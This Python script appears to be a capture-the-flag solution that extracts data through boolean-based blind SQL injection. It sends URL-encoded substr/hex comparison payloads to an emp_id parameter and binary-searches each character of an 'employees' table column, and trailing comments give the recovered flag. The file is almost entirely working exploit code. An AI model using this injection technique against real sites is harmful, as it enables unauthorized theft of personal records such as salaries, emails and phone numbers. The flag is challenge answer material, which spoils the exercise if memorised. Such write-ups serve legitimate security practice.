import httpx

url = "http://139.162.5.230:10175/search?emp_id="

# col_names = ["FirstName", "LastName", "Department", "Position", "Salary", "Email", "Phone", "JoinDate"]
col_names = ["Department"]
final = ""

for col_name in col_names:
    names = []
    for row in range(10, 11):
        name = ''
        pos = 1
        while True:
            low = 32
            high = 127
            while low + 1 < high:
                mid = (low + high) // 2
                r = httpx.get(url + f"1%20AND%20hex(substr((SELECT%20CAST({col_name}%20AS%20TEXT)%20FROM%20employees%20LIMIT%201%20OFFSET%20{row})%2c%20{pos}%2c%201))%20%3e%20HEX('{chr(mid)}')--%2b")
                if 'Employee Found.' in r.text:
                    low = mid
                else:
                    high = mid
                # print(r.text)
                # print(chr(mid))
                # print(low, mid, high)
            if chr(high) == '!': # dunno how to fix :(
                break
            name += chr(high)
            print('name so far:', name)
            pos += 1
        print(f'{col_name} - {row+1}:', name)
        names.append(name)
    print(f'Column {col_name}:', names)
    final += f"{col_name} -> {str(names)}\n"

print(final)

# OUTPUT : MUSCTCTF{D4t4_br3ach_1s_s3cur,ty_1ncident,,,}
# FLAG : MUSCTCTF{D4t4_br3ach_1s_s3cur!ty_1ncident!!!}